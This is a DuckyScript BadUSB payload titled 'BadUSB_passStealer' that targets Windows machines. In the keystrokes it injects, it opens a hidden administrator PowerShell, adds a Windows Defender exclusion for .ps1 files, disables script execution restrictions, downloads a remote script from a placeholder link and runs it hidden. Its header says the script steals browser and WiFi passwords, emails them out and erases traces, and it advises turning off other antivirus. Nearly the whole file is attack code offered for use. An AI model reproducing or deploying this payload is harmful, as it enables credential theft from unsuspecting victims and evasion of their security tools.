REM                      _                        
REM  _   _  ___  _   _  | | ___ __   _____      __
REM | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
REM | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
REM  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
REM  |___/                                        

REM #######################################################
REM #                                                     |
REM # Title        : BadUSB_passStealer                   |
REM # Author       : you.know                             |
REM # Version      : 1.0                                  |
REM # Category     : Exfiltration, Credentials, Execution |
REM # Target       : Windows 7/8/10/11                    |
REM # Details      : Opens powershell hidden, grabs any   |
REM #                browser passwords and WiFi passwords,|
REM #                saves them as .txt file and          |
REM #                exfiltrates info via email. Then it  |
REM #                cleans up traces.                    |
REM #                                                     |
REM #######################################################

REM Requirements:
REM     - Windows logged in
REM     - Internet connection
REM     - If the target has any other antivirus than Windows Defender, turn off antivirus.

DELAY 2500
REM Minimize all app
GUI d
DELAY 500
REM Start powershell as admin
GUI r
DELAY 500
STRING powershell.exe -windowstyle hidden
DELAY 200
CTRL SHIFT ENTER
DELAY 2000
LEFT
DELAY 150
ENTER
DELAY 1000
REM Go to public documents directory
STRING cd C:\Users\Public\Documents
ENTER
REM Add an exception for .ps1 files in antivirus
STRING Add-MpPreference -ExclusionExtension ps1 -Force
ENTER
REM Disable script blocker
STRING Set-ExecutionPolicy unrestricted -Force
ENTER
REM Download ps1 script
STRING wget LINK -OutFile ciaoV2_upload.ps1
ENTER
DELAY 3500
REM Start ps1 script
STRING powershell.exe -noexit -windowstyle hidden -file ciaoV2_upload.ps1
ENTER
REM Make capslock flash to know when you can unplug the BadUSB
CAPSLOCK
DELAY 500
CAPSLOCK
DELAY 500
CAPSLOCK
DELAY 500
CAPSLOCK
REM End of payload
